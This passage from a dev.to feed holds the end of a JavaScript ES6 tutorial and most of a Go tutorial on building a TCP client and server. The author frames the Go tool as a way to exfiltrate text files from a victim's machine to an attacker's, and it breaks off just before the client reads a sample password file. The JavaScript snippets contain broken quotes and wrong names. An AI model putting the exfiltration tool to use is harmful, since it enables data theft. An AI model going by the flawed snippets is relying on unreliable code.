&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[...&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,...&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
&lt;span class="c1"&gt;//[1,2,3,4]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#string-includes"&gt;
  &lt;/a&gt;
  String Includes()
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;Console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;apple&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;includes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;p1))
//Prints true
console.log(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="nx"&gt;apple&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;.includes(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="nx"&gt;tt&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="c1"&gt;//prints false&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#string-startswith"&gt;
  &lt;/a&gt;
  String StartsWith()
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;ab.repeat(3))
//prints &lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="nx"&gt;ababab&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#destructuring-array"&gt;
  &lt;/a&gt;
  Destructuring array
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;//3&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;//7&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#destucturing-object"&gt;
  &lt;/a&gt;
  Destucturing object
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="na"&gt;a&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;55&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="na"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;obj&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;//55&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;//44&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#object-property-assignment"&gt;
  &lt;/a&gt;
  Object property assignment
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;obj&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="c1"&gt;//before es6:&lt;/span&gt;
&lt;span class="c1"&gt;//obj ={a:a,b:b}&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;obj3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;//{a:2,b:5}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#objectassign"&gt;
  &lt;/a&gt;
  Object.Assign()
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;obj1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="na"&gt;a&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;obj2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="na"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;obj3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;assign&lt;/span&gt;&lt;span class="p"&gt;({},&lt;/span&gt;&lt;span class="nx"&gt;obj1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;obj2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;obj3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;//{a:1 ,b:2}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#promises-with-finally"&gt;
  &lt;/a&gt;
  Promises with finally
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;promise&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{...})&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{..})&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;finally&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;//Logic independent of success/error &lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>javascript</category>
      <category>beginners</category>
      <category>bestofdev</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Hack and Exfiltrate text files using GoLang</title>
      <author>Vedant Pareek</author>
      <pubDate>Sun, 23 Jan 2022 18:07:16 +0000</pubDate>
      <link>https://dev.to/dunefro/hack-and-exfiltrate-text-files-using-golang-14gg</link>
      <guid>https://dev.to/dunefro/hack-and-exfiltrate-text-files-using-golang-14gg</guid>
      <description>&lt;p&gt;This article will help you to write a Golang program which will transfer files from the remote machine (victim's machine) to your local environment(attacker's machine).&lt;/p&gt;

&lt;p&gt;This article is mainly for education purposes and can be used for small pen-testing scenarios as well ( I have used it and it really works). We can use tools like &lt;code&gt;scp&lt;/code&gt; and &lt;code&gt;nc&lt;/code&gt; as well to transfer file data but we here get a chance to do the same natively using Golang.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#plan-of-action"&gt;
  &lt;/a&gt;
  Plan of Action
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Setting up your workspace&lt;/li&gt;
&lt;li&gt;Create a TCP server which opens a TCP port for data transfer.&lt;/li&gt;
&lt;li&gt;Transfer data using &lt;code&gt;netcat&lt;/code&gt; to check connectivity.&lt;/li&gt;
&lt;li&gt;Concurrently listen to the data being sent.&lt;/li&gt;
&lt;li&gt;Create a client that sends data to the server.&lt;/li&gt;
&lt;li&gt;Modify the client to read a file and send data to the server.&lt;/li&gt;
&lt;li&gt;Create a CLI app using &lt;code&gt;cobra&lt;/code&gt; to combine client and server in a single application and use arguments to accept file names, hostname or IP address and port to connect.&lt;/li&gt;
&lt;li&gt;Make it Windows and Linux suitable. (For you to hack some readable windows file)&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#lets-begin"&gt;
  &lt;/a&gt;
  Let's begin
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#setting-up-your-workspace"&gt;
  &lt;/a&gt;
  Setting up your workspace
&lt;/h3&gt;

&lt;p&gt;First we create a folder called &lt;code&gt;data_exfiltrator&lt;/code&gt; in which our application will reside. Inside this we will create a folder called &lt;code&gt;server&lt;/code&gt; which will contain a file called &lt;code&gt;server.go&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;data_exfiltrator
└── server
    └── server.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#tcp-server"&gt;
  &lt;/a&gt;
  TCP server
&lt;/h3&gt;

&lt;p&gt;Now we will create a simple TCP server. For this we are using &lt;code&gt;127.0.0.1&lt;/code&gt; (localhost) and port 8080 to bind the server&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import "fmt"

// constant used for connections
const (
    connHost = "127.0.0.1"
    connPort = "8080"
    connType = "tcp"
)

func main() {
    fmt.Printf("Starting %s server on %s:%s\n", connType, connHost, connPort)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now we will open a socket so that we can use it as a server. For this we will try the &lt;code&gt;net&lt;/code&gt; package, natively provided to us, by Golang which is used for providing portable interface for network connections. &lt;code&gt;net&lt;/code&gt; package is easy to start with. &lt;/p&gt;

&lt;p&gt;When we run &lt;code&gt;net.Listen()&lt;/code&gt; we wish to listen on the network and when we run &lt;code&gt;net.Dial()&lt;/code&gt; we wish to dial the connection to some other program on a network. &lt;/p&gt;

&lt;p&gt;For server to server we use &lt;code&gt;net.Listen()&lt;/code&gt; &lt;br&gt;
for client to send data we use &lt;code&gt;net.Dial()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Right now to create a TCP server we will use &lt;code&gt;net.Listen()&lt;/code&gt;. Now the code will look like&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import (
    "fmt"
    "net"
)

const (
    connHost = "127.0.0.1"
    connPort = "8080"
    connType = "tcp"
)

func main() {
    fmt.Printf("Starting %s server on %s:%s\n", connType, connHost, connPort)

    // starting a server
    conn, err := net.Listen(connType, connHost+":"+connPort)

    if err != nil {
        fmt.Println("Connection error", connHost+":"+connPort)
        panic(err.Error())
    }
    defer conn.Close()

    // to continuously listen to connections
    fmt.Println("Listening ...")
    for {
        client, err := conn.Accept()
        if err != nil {
            panic(err.Error())
        }
        // To print the client address and port
        fmt.Println("Client", client.RemoteAddr().String(), "connected")

        // code here for accepting the traffic
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We start the server with &lt;code&gt;conn, err := net.Listen(connType, connHost+":"+connPort)&lt;/code&gt; and use &lt;code&gt;defer&lt;/code&gt; as best practice to safely close the connection. &lt;br&gt;
We run an infinite loop to listen to connections and use&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;client, err := conn.Accept()
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;to accept the connections. After this we will code what we need to do with the &lt;code&gt;client&lt;/code&gt; once a connection is accepted.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;func main() {
    fmt.Printf("Starting %s server on %s:%s\n", connType, connHost, connPort)

    // starting a server
    conn, err := net.Listen(connType, connHost+":"+connPort)

    if err != nil {
        fmt.Println("Connection error", connHost+":"+connPort)
        panic(err.Error())
    }
    defer conn.Close()

    // to continuously listen to connections
    fmt.Println("Listening ...")
    for {
        client, err := conn.Accept()
        if err != nil {
            panic(err.Error())
        }
        // To print the client address and port
        fmt.Println("Client", client.RemoteAddr().String(), "connected")

        // code here for accepting the traffic
        buffer, err := bufio.NewReader(client).ReadBytes('\n')
        if err != nil {
            fmt.Println("Client left")
            client.Close()
            return
        }
        fmt.Println("Client message:", string(buffer[:]))

        // We close the client just after receiveing one message
        client.Close()
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We create a Reader using &lt;code&gt;bufio&lt;/code&gt; package. This will create a reader for us which will read bytes and delimit them at &lt;code&gt;\n&lt;/code&gt;. The message from the client is stored in the &lt;code&gt;buffer&lt;/code&gt; variable as bytes which we convert to string using &lt;code&gt;string(buffer[:])&lt;/code&gt;. &lt;br&gt;
To run and test this, open two terminals -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;# First terminal
$ go run server/server.go                                                                                                         
Starting tcp server on 127.0.0.1:8080
Listening ...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;On the second terminal&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ nc localhost 8080
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and we will explain rest in the next section&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#using-raw-nc-endraw-or-raw-netcat-endraw-to-transfer-the-data"&gt;
  &lt;/a&gt;
  Using &lt;code&gt;nc&lt;/code&gt; or &lt;code&gt;netcat&lt;/code&gt; to transfer the data
&lt;/h3&gt;

&lt;p&gt;Once you run &lt;code&gt;nc&lt;/code&gt; command you will observe that our print statement is able to print out the connection details in the first terminal.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                         
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:40346 connected
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now in the second terminal we can just send the data by typing it&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ nc localhost 8080
hello
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;When we press enter after typing &lt;code&gt;hello&lt;/code&gt; we can see the same appears over on the terminal one.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                         
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:40984 connected
Client message: hello
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You will see that your connection on the terminal gets immediately closed because we are running &lt;code&gt;client.Close()&lt;/code&gt; in the last line of the code. To make it more interactive we will now convert this code to accept connections and handle the connection on some go routines.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#creating-goroutine-to-handle-client-connections"&gt;
  &lt;/a&gt;
  Creating goroutine to handle client connections
&lt;/h3&gt;

&lt;p&gt;Every connection to the server will be handled in a goroutine. Its very simple to implement and we will create a special function to do that. The name of the function is &lt;code&gt;handleConnection()&lt;/code&gt; and this function will take the client connection as the parameter and perform the given tasks.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;func main() {
    fmt.Printf("Starting %s server on %s:%s\n", connType, connHost, connPort)

    // starting a server
    conn, err := net.Listen(connType, connHost+":"+connPort)

    if err != nil {
        fmt.Println("Connection error", connHost+":"+connPort)
        panic(err.Error())
    }
    defer conn.Close()

    // to continuously listen to connections
    fmt.Println("Listening ...")
    for {
        client, err := conn.Accept()
        if err != nil {
            panic(err.Error())
        }
        // To print the client address and port
        fmt.Println("Client", client.RemoteAddr().String(), "connected")

        // code here for accepting the traffic
        go handleConnection(client)
    }
}

// Function to handle go routine after accepting client
func handleConnection(client net.Conn) {
    for {
        buffer, err := bufio.NewReader(client).ReadBytes('\n')
        if err != nil {
            fmt.Println("Client left")
            client.Close()
            return
        }
        fmt.Print("Client message:", string(buffer[:]))
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The &lt;code&gt;Client Left&lt;/code&gt; statement is executed in the &lt;code&gt;handleConnection()&lt;/code&gt; function when &lt;code&gt;bufio&lt;/code&gt; reader is not able to read the incoming bytes and this will happen when the client has closed the connection from its side. Now the server will not close the connection immediately as the goroutine is running an infinite loop to receive messages continuously from the client. It will be the client's responsibility to close the connection now.&lt;br&gt;
Terminal 1 - Running the server&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                         
Starting tcp server on 127.0.0.1:8080
Listening ...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Terminal 2 - Running the &lt;code&gt;nc&lt;/code&gt; client&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ nc localhost 8080
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now we will continuously send the messages from &lt;code&gt;nc&lt;/code&gt; and we can see the same getting reflected in the terminal 1&lt;br&gt;
Terminal 2 - &lt;code&gt;nc&lt;/code&gt; (Type your message and press enter to send the message)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ nc localhost 8080
hello
how
are
you
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Terminal 1 - Your server&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                    
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:55404 connected
Client message:hello
Client message:how
Client message:are
Client message:you
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;When we terminate the &lt;code&gt;nc&lt;/code&gt; command using Ctrl+C then we get a message on server that client has left.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                    
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:55404 connected
Client message:hello
Client message:how
Client message:are
Client message:you
Client left
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now you don't need to restart server for another connection. Just simply create a &lt;code&gt;nc&lt;/code&gt; client and start sending the messages again.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                                                    
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:55404 connected
Client message:hello
Client message:how
Client message:are
Client message:you
Client left
Client 127.0.0.1:55832 connected
Client message:hello how are you
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we see the client will get connected again through some different source port.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#create-a-client-that-sends-data-to-the-server"&gt;
  &lt;/a&gt;
  Create a client that sends data to the server
&lt;/h3&gt;

&lt;p&gt;Now we will remove the need of &lt;code&gt;nc&lt;/code&gt; and create our own client to achieve the same.&lt;br&gt;
For this create a directory called &lt;code&gt;client&lt;/code&gt; and create a file inside it called &lt;code&gt;client.go&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import (
    "bufio"
    "fmt"
    "os"
)

// there are server details to which client will connect
const (
    connHost = "127.0.0.1"
    connPort = "8080"
    connType = "tcp"
)

func main() {
    reader := bufio.NewReader(os.Stdin)
    for {
        fmt.Print("Enter text: ")
        text, _ := reader.ReadString('\n')
        fmt.Printf("Your text is %s", text)
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We have server details that we will use soon to connect our client to the server. Right now we have created a reader that takes input from the &lt;code&gt;os.Stdin&lt;/code&gt; (your terminal) and prints them out in a continuous loop. You can run this program via &lt;code&gt;go run client/client.go&lt;/code&gt; to test if it works for you.&lt;br&gt;
Now we will modify the &lt;code&gt;main&lt;/code&gt; function to send &lt;code&gt;text&lt;/code&gt; to our server and we already discussed to use &lt;code&gt;net.Dial()&lt;/code&gt; for this. So our &lt;code&gt;main&lt;/code&gt; function will become&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import (
    "bufio"
    "fmt"
    "net"
    "os"
)

// there are server details to which client will connect
const (
    connHost = "127.0.0.1"
    connPort = "8080"
    connType = "tcp"
)

func main() {

    // connecting to the server
    conn, err := net.Dial(connType, connHost+":"+connPort)
    if err != nil {
        fmt.Println("Not able to connect to ", connHost, "at port", connPort)
        panic(err.Error())
    }
    defer conn.Close()

    // creating a reader
    reader := bufio.NewReader(os.Stdin)

    for {
        fmt.Print("Enter text: ")
        text, _ := reader.ReadString('\n')

        // Convert the text to bytes and then write the bytes for it send to the connection.
        conn.Write([]byte(text))
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We create a block to connect to server and create a reader for reading input from &lt;code&gt;stdin&lt;/code&gt; and then send it by using &lt;code&gt;conn.Write()&lt;/code&gt; function.&lt;br&gt;
To run this we will first run a server in terminal 1 and client in terminal 2.&lt;br&gt;
Terminal - 1&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go 
Starting tcp server on 127.0.0.1:8080
Listening ...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Terminal - 2&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run client/client.go                                                                                                         
Enter text:
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Enter to send text&lt;br&gt;
Terminal - 2 (client)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run client/client.go                                                                                                         
Enter text: hello
Enter text: how
Enter text: are
Enter text: you
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Terminal - 1 (server)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go 
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:58480 connected
Client message:hello
Client message:how
Client message:are
Client message:you
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#modify-the-client-to-read-the-file"&gt;
  &lt;/a&gt;
  Modify the client to read the file
&lt;/h3&gt;

&lt;p&gt;Our main purpose is to exfiltrate text file form the victim's machine to the remote machine, so logically our client should read input from text files rather then &lt;code&gt;os.Stdin&lt;/code&gt;.&lt;br&gt;
For this we will create a text file &lt;code&gt;sample_input.txt&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;password1
password2
password3
password4
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Our directory structure looks like this&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ tree .
.
├── client
│   ├── client.go
│   └── sample_input.txt
└── server
    └── server.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



